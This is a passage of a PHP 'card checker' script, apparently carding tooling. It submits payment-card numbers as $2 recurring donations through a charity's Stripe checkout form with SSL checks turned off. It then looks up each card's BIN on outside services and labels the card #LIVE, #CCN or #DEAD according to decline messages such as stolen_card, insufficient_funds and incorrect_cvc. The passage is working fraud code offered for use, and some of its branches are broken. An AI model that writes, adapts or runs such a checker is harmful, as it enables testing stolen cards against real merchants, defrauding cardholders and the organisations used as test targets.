%5B%5D=czk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=djf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dkk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=egp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ern&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=etb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=eur&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=fjd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=fkp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gbp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gel&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ggp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ghs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gip&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gnf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gtq&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hkd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hnl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hrk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=htg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=huf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=idr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ils&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=imp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=inr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=iqd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=irr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=isk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jep&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jod&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jpy&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kes&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kgs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=khr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kmf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kpw&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=krw&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kwd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kzt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lak&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lbp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lkr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lrd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lsl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mdl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mga&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mkd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mmk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mnt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mro&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mur&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mvr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mwk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mxn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=myr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mzn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ngn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nio&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nok&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=npr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=omr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pab&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pen&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pgk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=php&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pkr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pln&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=prb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pyg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=qar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rmb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ron&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rsd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rub&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rwf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sbd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=scr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sdg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sek&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sgd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=shp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sll&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sos&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=srd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ssp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=std&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=syp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=szl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=thb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tjs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tmt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=top&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=try&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ttd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=twd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tzs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uah&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ugx&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=usd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uyu&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uzs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vef&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vuv&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=wst&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xaf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xcd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xof&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xpf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=yer&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=zar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=zmw&form_data%5BpaymentMethods%5D%5B0%5D%5Brecurring%5D=true&form_data%5BpaymentMethods%5D%5B0%5D%5Bstripe_checkout%5D=true&form_data%5BcustomAmount%5D=2&form_data%5BplanAmount%5D=2&form_data%5BcustomPlanAmount%5D=2&form_data%5BfinalAmount%5D=2.00&form_data%5BcouponCode%5D=&form_data%5Bdiscount%5D=0&form_data%5BuseCustomPlan%5D=true&form_id=699&customer_id='.$token2.'');
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$resultb = curl_exec($ch);

///////////////////////// Bin Lookup Api //////////////////////////
// this is for additional info - so result will look more good by adding the info of the bin

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
function getbnk($bin)
{
 sleep(rand(1,6));
$bin = substr($bin,0,6);
$url = 'http://bins.su';
//  Initiate curl
$ch = curl_init();
// Disable SSL verification
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
// Will return the response, if false it print the response
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// Set the url
curl_setopt($ch, CURLOPT_URL,$url);
// Execute
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&BIN=&country=');
$result=curl_exec($ch);
// Closing
curl_close($ch);

// Will dump a beauty json :3
//var_dump(json_decode($result, true));

if (preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $matches1))
{
$r1 = $matches1[1][0];
$r2 = $matches1[2][0];
$r3 = $matches1[3][0];
$r4 = $matches1[4][0];
$r5 = $matches1[5][0];
//if(stristr($result,$ip'<tr><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>'))

 return "$r2 - $r1 - $r3 - $r4 - $r5";

}
else
{
 return "$bin|Unknown.";
}
}
/////////////////////////// [Card Response]  //////////////////////////
//////// dependig upon response of site you have to add or delete the results

if(strpos($result, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-dark">#LIVE</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Approved</span></span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span></br';
}
elseif(strpos($result,'"cvc_check":"pass",')){
    echo '<span class="badge badge-dark">#LIVE</span> </span> </span> <span class="badge badge-light">'.$lista.'</span> <span class="badge badge-light">INFO:CVV MATCHED!</span> </span> <span class="badge badge-light">'.getbnk($cc).'</span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
    echo '<span class="badge badge-dark">#LIVE</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Approved</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "Thank You." )) {
    echo '<span class="badge badge-dark">Aprovada</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Approved</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result,'"status": "succeeded"')){
    echo '<span class="badge badge-dark">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Approved</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-dark">#LIVE</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined✘</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "incorrect_zip" )) {
    echo '<span class="badge badge-dark">#LIVE</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined✘</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result,"The zip code you supplied failed validation.")){
    echo '<span class="badge badge-dark">#LIVE</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined✘</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "dark" )) {
    echo '<span class="badge badge-dark">#LIVE</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined✘</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "succeeded." )) {
    echo '<span class="badge badge-dark">#LIVE</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined✘</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-dark">#CCN</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined✘</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result,'"type":"one-time"')){
    echo '<span class="badge badge-dark">DIE✘</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined✘</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-dark">#LIVE</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined✘ ʏᴏᴜʀ ᴄᴀʀᴅ ʜᴀs ɪɴsᴜғғɪᴄɪᴇɴᴛ ғᴜɴᴅs</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "insufficient_funds")) {
    echo '<span class="badge badge-dark">#LIVE</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined✘ ɪɴsᴜғғɪᴄɪᴇɴᴛ_ғᴜɴᴅs</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "lost_card" )) {
    echo '<span class="badge badge-dark">#CCN</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined✘ ʟᴏsᴛ_ᴄᴀʀᴅ</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "stolen_card" )) {
    echo '<span class="badge badge-dark">#CCN</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined✘ sᴛᴏʟᴇɴ_ᴄᴀʀᴅ</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-warning">#CCN</span> <span class="badge badge-light">'.$lista.'</span> <span class="badge badge-warning">INFO:CCN MATCHED!</span> <span class="badge badge-light">'.getbnk($cc).'</span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span></br>';
}
elseif(strpos($result, "The card's security code is incorrect." )) {
    echo '<span class="badge badge-warning">#CCN</span> <span class="badge badge-light">'.$lista.'</span> <span class="badge badge-warning">INFO:CCN MATCHED!</span> <span class="badge badge-light">'.getbnk($cc).'</span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
    echo '<span class="badge badge-dark">#CCN</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">INFO:CCN MATCHED!</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "incorrect_cvc" )) {
    echo '<span class="badge badge-dark">#CCN</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">INFO:CCN MATCHED!</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "pickup_card" )) {
    echo '<span class="badge badge-dark">#CCN</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">INFO:CCN MATCHED!</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">EXPIRED CARD!</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "expired_card" )) {
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">EXPIRED CARD!</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">INCORRECT CARD NUMBER!</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">INCORRECT CARD NUMBER!</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "service_not_allowed")) {
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "do_not_honor")) {
    echo '<span class="badge badge-dark">#DEAD</span> </span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">DO NOT HONOR!</span> ◈</span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">INFO:YOUR CARD WAS DECLINED!</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "generic_decline")) {
    echo '<span class="badge badge-dark">#DEAD</span> </span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">GENERIC DECLINE!</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">UNAVAILABLE!</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-dark">#DEAD</span> </span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">DEAD SITE!</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, '"cvc_check":"fail"' )) {
    echo '<span class="badge badge-warning">#CCN</span> <span class="badge badge-light">'.$lista.'</span> <span class="badge badge-warning">INFO:CCN MATCHED!</span> <span class="badge badge-light">'.getbnk($cc).'</span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span></br>';
}
elseif(strpos($result,"parameter_invalid_empty")){
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result,"lock_timeout")){
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result,"transaction_not_allowed")){
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result,"three_d_secure_redirect")){
     echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result,"missing_payment_information")){
     '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
     '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
elseif (strpos($result, "Your payment has already been processed")) {
  echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
else {
    echo '<span class="badge badge-dark">#DEAD</span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark">Declined</span> </span> <span class="badge badge-dark">𝐃 𝐀 𝐙 𝐀 𝐈</span> </br>';
}
  curl_close($curl);
  ob_flush();

  //////=========Comment echo $result If U Want To Hide Site Side Response
/////////////////////=====Edited By @MrNiceguy25                  =======================Credits to Chillz====================\\\\\\\\\\\\\\\

?>
